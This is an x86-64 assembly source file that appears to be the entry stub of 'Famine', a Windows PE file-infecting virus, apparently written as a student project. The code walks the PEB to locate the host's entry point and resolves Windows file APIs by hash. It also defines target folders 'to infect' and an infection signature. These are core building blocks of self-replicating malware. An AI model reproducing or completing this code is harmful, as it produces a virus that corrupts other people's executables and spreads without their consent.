[BITS 64]

section .text
    global start
    extern _get_proc_address
    extern _recursive_directory
    extern _get_address_table


;------------------------------; ***EntryPoint***
start:
    ; Align the stack to 16 bytes
    sub rsp, 0x20
    call _saveEntryPoint
    mov rbx, rax
    jmp _get_address_table

;------------------------------; Data in .famine section
_address_table_hash:
    localAlloc_hash dd 0x528176EE; + 0x11 | 0x4
    localFree_hash  dd 0xEA61FCB1; + 0x15
    exitProcess dd 0x56A2B5F0
    createFileA dd 0x4FDAF6DA
    getFileSize dd 0x701E12C6
    readFile dd 0xBB5F9EAD
    writeFile dd 0x5BAE572D
    closeHandle dd 0x528796C6
    findFirstFileA dd 0x95DA3590
    findNextFileA dd 0xF76C45E7
    setCurrentDirectoryA dd 0xAD2D1512
    getCurrentDirectoryA dd 0xED2D1511
    getModuleHandleA dd 0xDAD5B06C ; + 0x41
_resources:
    folderToInfect1 db "C:\\Users\\Administrator\\Desktop\\famine\\famine\\tmp\\test\\", 0 ; + 0x45
    folderToInfect2 db "./tmp/test2/*", 0
    target db "*", 0
    name db ".text", 0
    dotdot			db	"..", 0
    signature		db	"alca", 0
    ; signature db "Famine version 1.0 (c)oded by jdecorte-mbucci", 0
;------------------------------;

_saveEntryPoint:
    xor rax, rax
    mov rax, gs:[0x60]          ; RAX = Address of PEB

    mov rax, [rax + 0x18]       ; RAX = PEB_LDR_DATA (PEB->Ldr)
    mov rax, [rax + 0x10]       ; RAX = InLoadOrderModuleList (first module entry)
    
    mov rbx, [rax + 0x30]       ; RBX = Base address of the main module (LDR_DATA_TABLE_ENTRY->DllBase)

    xor rax, rax
    mov eax, [rbx + 0x3C]       ; RAX = Offset to IMAGE_NT_HEADERS (e_lfanew)
    add rax, rbx                ; RAX = Address of IMAGE_NT_HEADERS
    mov eax, [rax + 0x18 + 0x10] ; RAX = Entry point RVA (OptionalHeader.AddressOfEntryPoint)
    add rax, rbx                ; RAX = Entry point address (Base + RVA)

    ret